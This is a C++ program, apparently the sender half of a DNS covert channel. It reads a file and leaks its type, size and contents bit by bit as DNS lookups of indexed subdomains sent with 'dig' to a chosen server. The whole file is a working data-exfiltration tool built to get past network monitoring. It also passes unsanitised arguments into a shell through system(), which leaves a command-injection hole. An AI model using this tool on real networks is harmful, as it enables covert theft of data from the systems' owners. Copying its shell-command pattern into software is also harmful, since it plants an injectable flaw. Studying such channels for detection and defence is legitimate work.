#include <iostream>
#include <fstream>
#include <bitset>
#include <string>
#include <unistd.h>
#include <cstring>
#include <unordered_map>
#include <cstdint>
#include <chrono>
#include <thread>
#include <vector>
#include "extension_map.h"
using namespace std;

#ifdef DEBUG
#define DEBUG_COUT(x) do { x } while(0)
#else
#define DEBUG_COUT(x) do {} while(0)
#endif

bool transmit(string query_domain, string dns_server){
    string cmd;
    cmd = "dig +noall +tcp @" + dns_server + " " + query_domain;
    DEBUG_COUT(cout << "Executing command: " << cmd << endl;);
    int ret = system(cmd.c_str());
    if (ret == -1) {
        cerr << "Failed to execute command: " << cmd << endl;
        return false;
    }
    return true;
}

bool send_message(string filename, string nxdomain, string dns_server){
    // Read input file 
    ifstream input_file(filename, ios::binary);
	
    // Check if file opened successfully, if not, print error message and return 1
    if (!input_file.is_open()) {
        cerr << "Unable to open " << filename << endl;
        return false;
    }

    // Get file size
    input_file.seekg(0, input_file.end);
    size_t size = input_file.tellg();
    input_file.seekg(0, input_file.beg);

    // Initialize type(8-bit) and length(24-bit)
    uint8_t type[1] = {0};
    uint8_t length[3] = {0};

    // Get type, using extension_map.h function "getTypeValue"
    type[0] = getTypeValue(filename);

    // Get length (file size)
    length[0] = (size >> 16) & 0xFF;
    length[1] = (size >> 8)  & 0xFF;
    length[2] = size & 0xFF;

#ifdef DEBUG   // Show type and length after setting
    cout << "After Type: " << bitset<8>(type[0]) << endl;
    cout << "File size is: " << size << " bytes\n";
    cout << "File size is (hex): " << hex <<  size << dec << " bytes\n";
    cout << "After Length: " << bitset<8>(length[0]) << " " 
                             << bitset<8>(length[1]) << " " 
                             << bitset<8>(length[2]) << endl;
#endif

    // Initialize value and read from input file
    char* value = new char[size];
    input_file.read(value, size); 
    input_file.close();


    // Step1: Send type (8-bit) 
    bitset<8> b_type(type[0]);
    vector<thread> workers;
    workers.reserve(b_type.size());
    
    for (size_t i = 0; i < b_type.size(); i++) {
        DEBUG_COUT(cout << "b_type[" << i << "]: " << b_type[i] << endl;);
        if (b_type[i] == 1) {
            string query_domain = to_string(i) + "." + nxdomain;         
            workers.emplace_back([query_domain, &dns_server]{
                transmit(query_domain, dns_server);
            });
        }
    }

    for (auto &t: workers) t.join();

    // Step2: Send length (24-bit) 
    for (size_t i = 0; i < 3; i++) {
        bitset<8> b_length(length[i]);
        vector<thread> workers;
        workers.reserve(b_length.size());
        DEBUG_COUT(cout << "===================\n" 
             << "length[" << i << "]: " << length[i] << "  "
             << "b_length holds " << b_length << endl;);
        for (size_t j = 0; j < b_length.size(); j++) {
            DEBUG_COUT(cout << "b_length[" << 8+i*8+j << "]: " << b_length[j] << endl;);
            if (b_length[j] == 1) {
                int index = 8 + i*8 + j;
                string query_domain = to_string(index) + "." + nxdomain;
                workers.emplace_back([query_domain, &dns_server]{
                    transmit(query_domain, dns_server);
                });
            }
        }

        for (auto &t: workers) t.join();
    }

    // Step3: Send value
    for (size_t i = 0; i < size; i++) {
        bitset<8> bits(value[i]);
        vector<thread> workers;
        workers.reserve(bits.size());
        DEBUG_COUT(cout << "===================\n"
             << "value[" << i << "]: " << value[i] << "  "
             << "bits holds " << bits << endl;);
        for (size_t j = 0; j < bits.size(); j++) {
            DEBUG_COUT(cout << "bits[" << 32 + i*8+j << "]: " << bits[j] << endl;);
            if (bits[j] == 1) {
                int index = 32 + i*8 + j;
                string query_domain = to_string(index) + "." + nxdomain;
                workers.emplace_back([query_domain, &dns_server]{
                    transmit(query_domain, dns_server);
                });
            }
        }

        for (auto &t: workers) t.join();
    }
       
    // free memory
    delete[] value;
    return true;
}


int main(int argc, char** argv){
    // Check command line arguments
    if (argc != 4) {
        cerr << "Usage: " << argv[0] << " <filename> <nxdomain> <dns_server>" << endl;
        return 1;
    }

    // ------ start measure ------
    auto start = chrono::high_resolution_clock::now();
    if(!send_message(argv[1], argv[2], argv[3])){
        cerr << "send message() failed.\n";
        return 1;
    }

    // ------- end measure ------
    auto end = chrono::high_resolution_clock::now();

    // ------- total time -------
    auto total_time = chrono::duration_cast<chrono::milliseconds>(end - start).count();
    cout << "sender runtime: " << total_time << " ms";

    return 0;
}
